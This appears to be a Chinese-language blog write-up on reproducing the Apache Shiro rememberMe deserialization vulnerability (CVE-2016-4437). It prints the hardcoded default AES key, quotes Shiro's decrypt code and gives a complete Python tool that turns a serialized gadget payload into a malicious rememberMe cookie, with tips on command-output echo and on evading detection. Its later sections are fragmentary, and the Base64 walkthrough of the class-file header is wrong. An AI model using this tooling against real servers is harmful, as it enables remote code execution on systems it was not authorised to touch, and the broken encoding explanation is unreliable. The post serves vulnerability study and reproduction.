## shiro介绍

  Apache Shiro是一个强大且易用的Java安全框架，提供了身份验证、授权、密码学和会话管理等功能。它被广泛用于保护各种类型的应用程序，包括Web应用、RESTful服务、移动应用和大型企业级应用。使用Shiro，你可以将安全性集成到应用程序中而不必担心复杂的实现细节。在历史上，shiro的历史漏洞大部分都是一些对路径未标准化进行的一个bypass。**本文的调试和漏洞复现仅针对Shiro体系下的 反序列化漏洞**。

## CVE-2016-4437

### 漏洞原理

  在默认情况下 , Apache Shiro 使用 CookieRememberMeManager 对用户身份进行序列化/反序列化 , 加密/解密和编码/解码 , 以供以后检索 。因此 , 当 Apache Shiro 接收到未经身份验证的用户请求时 , 会执行以下操作来寻找他们被记住的身份.

从请求数据包中提取 Cookie 中 rememberMe 字段的值，对提取的 Cookie 值进行 Base64 解码，对 Base64 解码后的值进行 AES 解密，对解密后的字节数组调用 ObjectInputStream.readObject() 方法来反序列化。

但是默认AES加密密钥是 “硬编码” 在代码中的 。**硬编码的值为：kPH+bIxk5D2deZiIxcaaaA==**  因此 , 如果服务端采用默认加密密钥 , 那么攻击者就可以构造一个恶意对象 , 并对其进行序列化 , AES加密 , Base64编码 , 将其作为 Cookie 中 rememberMe 字段值发送 。 Apache Shiro 在接收到请求时会反序列化恶意对象 , 从而执行攻击者指定的任意代码 。

Shiro 550 反序列化漏洞存在版本：**shiro <=1.2.4**，产生原因是因为shiro接受了Cookie里面rememberMe的值，然后去进行Base64解密后，再使用aes密钥解密后的数据，进行反序列化。

```
public ByteSource decrypt(byte[] ciphertext, byte[] key) throws CryptoException {

    byte[] encrypted = ciphertext;

    //No IV, check if we need to read the IV from the stream:
    byte[] iv = null;

    if (isGenerateInitializationVectors(false)) {
        try {
            //We are generating IVs, so the ciphertext argument array is not actually 100% cipher text.  Instead, it
            //is:
            // - the first N bytes is the initialization vector, where N equals the value of the
            // 'initializationVectorSize' attribute.
            // - the remaining bytes in the method argument (arg.length - N) is the real cipher text.

            //So we need to chunk the method argument into its constituent parts to find the IV and then use
            //the IV to decrypt the real ciphertext:

            int ivSize = getInitializationVectorSize();
            int ivByteSize = ivSize / BITS_PER_BYTE;

            //now we know how large the iv is, so extract the iv bytes:
            iv = new byte[ivByteSize];
            System.arraycopy(ciphertext, 0, iv, 0, ivByteSize);

            //remaining data is the actual encrypted ciphertext.  Isolate it:
            int encryptedSize = ciphertext.length - ivByteSize;
            encrypted = new byte[encryptedSize];
            System.arraycopy(ciphertext, ivByteSize, encrypted, 0, encryptedSize);
        } catch (Exception e) {
            String msg = "Unable to correctly extract the Initialization Vector or ciphertext.";
            throw new CryptoException(msg, e);
        }
    }

    return decrypt(encrypted, key, iv);
}

  Shiro这个组件它是**内置CB链**的，所以我们可以利用CB链来进行打反序列化的。

![image-20260419205601351](/img/shiro反序列化漏洞学习/image-20260419205601351.png)

#### serialVersionUID的问题

  Java反序列化时，如果服务端和Payload的类**serialVersionUID不一致**，会抛出以下的报错：

```
java.io.InvalidClassException: 
    local class incompatible: 
    stream classdesc serialVersionUID = xxxx, 
    local class serialVersionUID = yyyy
```

​    这里直接引入P牛的话：如果两个不同版本的库使用了同一个类，而这两个类可能有一些方法和属性有了变化，此时在序列化通信的时候就可能因为不兼容导致出现隐患。因此，Java在反序列化的时候提供了一个机制，序列化时会根据固定算法计算出一个当前类的 serialVersionUID 值，写入数据流中；反序列化时，如果发现对方的环境中这个类计算出的 serialVersionUID 不同，则反序列化就会异常退出，避免后续的未知隐患。

​    所以出现这个原因大多数情况就是攻击方和服务端使用的CB包版本不一致导致的结果。我们打开java-chains看链子，你会看到他有很多不同版本的CB链，原因就是处理这个serialVersionUID的问题。

### 编写shiro加密并反序列化

  从前面我们得知了怎么解密 就是base64解码-aes解密还原。那我们加密就是逆着来，即aes加密-base64编码。根据我们前面的图解章节，我让ai根据要求自写了一个脚本。

```
#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import sys
import os
import base64
import argparse
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

def aes_encrypt(data, key):
    iv = os.urandom(16)
    cipher = AES.new(key, AES.MODE_CBC, iv)
    encrypted = cipher.encrypt(pad(data, AES.block_size))
    return iv + encrypted

def main():
    parser = argparse.ArgumentParser(
        description='Shiro RememberMe AES Encrypt Tool',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog='''
Examples:
  python3 shiroser.py -ser ser.bin
  python3 shiroser.py -key "kPH+bIxk5D2deZiIxcaaaA==" -ser ser.bin
  python3 shiroser.py -k "4AvVhmFLUs0KTA3Kprsdag==" -s payload.bin
        '''
    )
    
    parser.add_argument('-k', '--key', 
                        default='kPH+bIxk5D2deZiIxcaaaA==',
                        help='AES key (default: kPH+bIxk5D2deZiIxcaaaA==)')
    
    parser.add_argument('-s', '--ser', 
                        required=True,
                        help='Serialized payload file path')
    
    args = parser.parse_args()
    
    try:
        key = base64.b64decode(args.key)
        if len(key) != 16:
            print(f"[!] Error: AES key must be 16 bytes, got {len(key)} bytes")
            sys.exit(1)
    except Exception as e:
        print(f"[!] Error decoding key: {e}")
        sys.exit(1)
    
    if not os.path.exists(args.ser):
        print(f"[!] Error: File not found: {args.ser}")
        sys.exit(1)
    
    with open(args.ser, 'rb') as f:
        serialized_data = f.read()
    
    encrypted_data = aes_encrypt(serialized_data, key)
    
    remember_me = base64.b64encode(encrypted_data).decode()
    
    print(f"[*] AES Key (Base64): {args.key}")
    print(f"[*] AES Key (Hex): {key.hex()}")
    print(f"[*] Payload File: {args.ser}")
    print(f"[*] Payload Size: {len(serialized_data)} bytes")
    print(f"[*] Encrypted Size: {len(encrypted_data)} bytes")
    print("-" * 60)
    print("[+] RememberMe Cookie Value:")
    print(remember_me)
    print("-" * 60)
    print("[+] Full Cookie Header:")
    print(f"rememberMe={remember_me}")
    print("-" * 60)
    
    output_file = "rememberMe.txt"
    with open(output_file, 'w') as f:
        f.write(f"rememberMe={remember_me}")
    print(f"[+] Saved to: {output_file}")

if __name__ == '__main__':
    main()

```
      // 1. 执行命令并Base64编码输出

      // 6. 调用req.getResponse()获取response
      // 7. 通过response.addHeader("X-C", base64Output)回显
```

```
# 原始字节 (Class 文件前 8 字节)
0xCA 0xFE 0xBA 0xBE  0x00 0x00  0x00 0x34
#   ↓ Base64 编码
# 0xCAFE = 11001010 11111110 → "yv"
# 0xBABE = 10111010 10111110 → "66"
# 0x0000 = 00000000 00000000 → "vg"
# 0x0034 = 00000000 00110100 → "AA"
```

| 二进制   | 十进制 | Base64 字符            |
| -------- | ------ | ---------------------- |
| `110010` | 50     | `y`                    |
| `101110` | 46     | `v`                    |
| `101010` | 42     | `6`                    |
| `111110` | 62     | `+` → 但这里看实际分组 |

  所以它这里最好建议使用url编码减少特征。
